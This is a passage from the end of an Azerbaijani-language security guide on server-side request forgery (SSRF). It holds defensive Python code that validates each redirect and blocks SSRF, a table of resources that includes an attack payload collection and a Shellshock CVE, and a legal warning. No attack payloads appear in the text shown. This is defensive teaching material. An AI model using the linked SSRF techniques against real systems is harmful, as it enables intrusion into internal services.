        response = session.get(url, allow_redirects=False, timeout=self.timeout)
        
        redirect_count = 0
        while response.is_redirect and redirect_count < self.max_redirects:
            redirect_url = response.headers.get('Location')
            
            if not self.validate(redirect_url):
                raise ValueError(f"SSRF blocked (redirect): {redirect_url}")
            
            response = session.get(redirect_url, allow_redirects=False, timeout=self.timeout)
            redirect_count += 1
        
        return response
```

---

## 📚 Əlavə Resurslar

| Resurs | Link |
|--------|------|
| PortSwigger SSRF Labs | https://portswigger.net/web-security/ssrf |
| OWASP SSRF Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html |
| PayloadsAllTheThings SSRF | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery |
| Shellshock CVE-2014-6271 | https://nvd.nist.gov/vuln/detail/CVE-2014-6271 |

---

> **⚠️ Qanuni Xəbərdarlıq:** Bu sənəd yalnız təhsil məqsədi daşıyır. SSRF hücumları icazəsiz sistemlərə qarşı qeyri-qanuni sayılır. Yalnız öz sistemlərinizdə və ya icazə verilmiş bug bounty proqramlarında test edin.

---

*Hazırladı: Security Research Documentation | Versiya: 1.0 | Format: GitHub Markdown*
